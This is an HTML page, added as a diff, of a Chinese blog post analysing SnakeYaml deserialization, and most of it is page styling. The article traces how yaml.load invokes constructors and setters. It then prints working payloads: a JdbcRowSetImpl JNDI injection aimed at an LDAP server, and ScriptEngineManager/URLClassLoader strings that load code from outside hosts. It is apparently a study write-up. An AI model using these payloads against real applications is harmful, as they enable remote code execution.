@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/img/website.jpg">
+    <link rel="icon" type="image/png" href="/img/website.jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>SnakeYaml反序列化漏洞分析article - siteKaGty1 &#39;s Personal Blog</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="KaGty1">
+    <meta name="keywords" content="">
+    <meta property="og:title" content="SnakeYaml反序列化漏洞分析"/>
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: rgba(255, 255, 255, 0.8);
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+}
+body {
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+    overflow-x: hidden;
+    transition: all .3s;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+    backdrop-filter: blur(4px);
+    transition: all .3s;
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+    .post-copyright:after {
+        position: absolute;
+        color: #fff;
+        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+        content: ' ';
+        height: 10rem;
+        width: 10rem;
+        right: -2rem;
+        top: -2rem;
+        opacity: .1;
+    }
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">KaGty1 &#39;s Personal Blog</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+		<a href="/" class="button">
+			<div class="navbar-menu">首页</div>
+		</a>
+		
+		<a href="/archives/" class="button">
+			<div class="navbar-menu">博文</div>
+		</a>
+		
+		<a href="/categories/" class="button">
+			<div class="navbar-menu">分类</div>
+		</a>
+		
+		<a href="/talk/" class="button">
+			<div class="navbar-menu">说说</div>
+		</a>
+		
+		<a href="/links/" class="button">
+			<div class="navbar-menu">友链</div>
+		</a>
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+		<a href="/" class="dropdown-menu button">首页</a>
+		<br>
+		
+		<a href="/archives/" class="dropdown-menu button">博文</a>
+		<br>
+		
+		<a href="/categories/" class="dropdown-menu button">分类</a>
+		<br>
+		
+		<a href="/talk/" class="dropdown-menu button">说说</a>
+		<br>
+		
+		<a href="/links/" class="dropdown-menu button">友链</a>
+		<br>
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>SnakeYaml反序列化漏洞分析</h3>
+    
+      <span class="post-meta-label">
+        KaGty1
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2025-03-24 10:42" pubdate>
+          2025-03-24
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 1.3k 字
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        
+        预计 
+        17
+         分钟
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        <span id="busuanzi_container_page_pv">
+          共 <span id="busuanzi_value_page_pv"></span> 次阅读
+        </span>
+      </span>
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#SnakeYaml%E4%B8%8EFastjson%E7%9A%84%E5%8A%9F%E8%83%BD%E5%AF%B9%E6%AF%94"><span class="toc-number">1.</span> <span class="toc-text">SnakeYaml与Fastjson的功能对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%B0%84%E4%B8%8E%E5%BA%8F%E5%88%97"><span class="toc-number">2.</span> <span class="toc-text">映射与序列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%B0%84-Mapping"><span class="toc-number">3.</span> <span class="toc-text">映射(Mapping)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#JdbcRowSetImpl%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">JdbcRowSetImpl链</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97-Sequence"><span class="toc-number">4.</span> <span class="toc-text">序列(Sequence)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#javax-script-ScriptEngineManager%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text">javax.script.ScriptEngineManager链</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SnakeYaml-C3P0"><span class="toc-number">5.</span> <span class="toc-text">SnakeYaml + C3P0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#jndi%E9%93%BE"><span class="toc-number">5.1.</span> <span class="toc-text">jndi链</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Hex%E6%B5%81%E5%8F%8D%E5%BA%8F%E5%8C%96%E9%93%BE"><span class="toc-number">5.2.</span> <span class="toc-text">Hex流反序化链</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8Bpayload"><span class="toc-number">6.</span> <span class="toc-text">探测payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">7.</span> <span class="toc-text">写在最后</span></a></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h4 id="SnakeYaml与Fastjson的功能对比"><a href="#SnakeYaml与Fastjson的功能对比" class="headerlink" title="SnakeYaml与Fastjson的功能对比"></a>SnakeYaml与Fastjson的功能对比</h4><p><code>SnakeYaml</code>的功能是将一个<code>java</code>对象序列化为<code>.yaml</code>文件 &amp;&amp; 将<code>.yaml</code>文件反序列化回一个<code>java</code>对象</p>
+<p><code>SnakeYaml</code>的功能是将一个<code>java</code>对象序列化为<code>.json</code>文件 &amp;&amp; 将<code>.json</code>文件反序列化回一个<code>java</code>对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">yaml.dump(xxxx); <span class="comment">//将java对象序列化转换为.yaml文件</span></span><br><span class="line">yaml.load(xxxx); <span class="comment">//入参为字符串/.yaml文件 -&gt; 反序列化为java对象 -&gt; 产生java反序列化漏洞</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SnakeYaml中的 !!User&#123;age: <span class="number">18</span>, name: xiaobei&#125; 中的 !! --&gt; 等效于 Fastjson中的 @type</span><br></pre></td></tr></table></figure>
+
+<h4 id="映射与序列"><a href="#映射与序列" class="headerlink" title="映射与序列"></a>映射与序列</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SnakeYaml序列化java对象后字符串 - 映射(<span class="keyword">Mapping</span>)写法：</span><br><span class="line">!!<span class="keyword">User</span>&#123;age: <span class="number">18</span>, <span class="type">name</span>: xiaobei&#125;</span><br><span class="line"></span><br><span class="line">等价YAML语法写法：</span><br><span class="line">!!<span class="keyword">User</span></span><br><span class="line">age: <span class="number">18</span></span><br><span class="line"><span class="type">name</span>: xiaobei</span><br><span class="line"></span><br><span class="line">等价<span class="type">JSON</span>结构:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;age&quot;: <span class="number">18</span></span><br><span class="line">	&quot;name&quot;: xiaobei</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SnakeYaml序列化java对象后字符串 - 序列(Sequence)写法：</span><br><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader <span class="string">[[!!java.net.URL [\&quot;http://f80226cf33.ipv6.1433.eu.org\&quot;]]</span>]]</span><br><span class="line"><span class="comment">--链式结构</span></span><br></pre></td></tr></table></figure>
+
+<p>所以这两种写法在<code>SnakeYaml</code>中对应着两个不同的构造函数</p>
+<h4 id="映射-Mapping"><a href="#映射-Mapping" class="headerlink" title="映射(Mapping)"></a>映射(Mapping)</h4><p>先用一个<code>User</code>类Demo进行调试分析</p>
+<p><code>User.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User类的无参构造函数被调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>SnakeYamlDemo.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SankeYamlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;xiaobei&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dump</span> <span class="operator">=</span> yaml.dump(user);</span><br><span class="line">        System.out.println(dump);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;!!User &#123;age: 18, name: xiaobei&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> yaml.load(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------</span><br><span class="line">调用结果：</span><br><span class="line">User类的无参构造函数被调用</span><br><span class="line">setAge方法被调用</span><br><span class="line">setName方法被调用</span><br></pre></td></tr></table></figure>
+
+<p>可以看到反序列化过程中调用了<code>User</code>类的无参构造方法和<code>setter</code>方法。</p>
+<p>调用堆栈：</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">constructJavaBean2ndStep:<span class="number">285</span>, <span class="function"><span class="keyword">Constructor</span>$<span class="title">ConstructMapping</span> <span class="params">(org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">construct</span>:</span><span class="number">171</span>, <span class="function"><span class="keyword">Constructor</span>$<span class="title">ConstructMapping</span> <span class="params">(org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">construct</span>:</span><span class="number">331</span>, <span class="function"><span class="keyword">Constructor</span>$<span class="title">ConstructYamlObject</span> <span class="params">(org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">constructObjectNoCheck</span>:</span><span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.<span class="keyword">constructor</span>)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>!!User &#123;age: 18, name: xiaobei&#125;</code>属于映射，所以调用<code>MappingNode</code>的构造函数<code>org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#construct</code>，这里通过调用内置逻辑创建了<code>User</code>类的实例对象，跟进去看一下内置逻辑是怎么写的</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250324173052599.png" alt="image-20250324173052599"></p>
+<p>最终的逻辑在<code>org.yaml.snakeyaml.constructor.BaseConstructor#newInstance(java.lang.Class&lt;?&gt;, org.yaml.snakeyaml.nodes.Node, boolean)</code>，通过反射机制获取并调用<code>User</code>类的无参构造方法，并调用创建<code>User</code>类的实例对象</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250324173521094.png" alt="image-20250324173521094"></p>
+<p>继续返回跟进<code>constructJavaBean2ndStep</code>方法，在这个方法中会取出映射中的<code>Key</code>与<code>Value</code>的值，并利用反射机制调用<code>User</code>类的&#96;&#96;setter&#96;方法进行赋值</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250324173839048.png" alt="image-20250324173839048"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250324173915382.png" alt="image-20250324173915382"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250324174011413.png" alt="image-20250324174011413"></p>
+<h5 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h5><p>已知当<code>SnakeYaml</code>反序列化字符串为<code>Mapping</code>映射形式时，会调用反序列化目标类的无参构造方法和<code>setter</code>方法，所以思路1是利用<code>JdbcRowSetImpl</code>链打<code>Jndi</code>注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://192.168.43.95:8085/ZsKMAVbg, autoCommit: true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">yaml.load(command);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="序列-Sequence"><a href="#序列-Sequence" class="headerlink" title="序列(Sequence)"></a>序列(Sequence)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://u4zgic3x5a6v3nm7nx00okga51bszunj.oastify.com\&quot;]]]]&quot;</span>;</span><br><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">yaml.load(command);</span><br></pre></td></tr></table></figure>
+
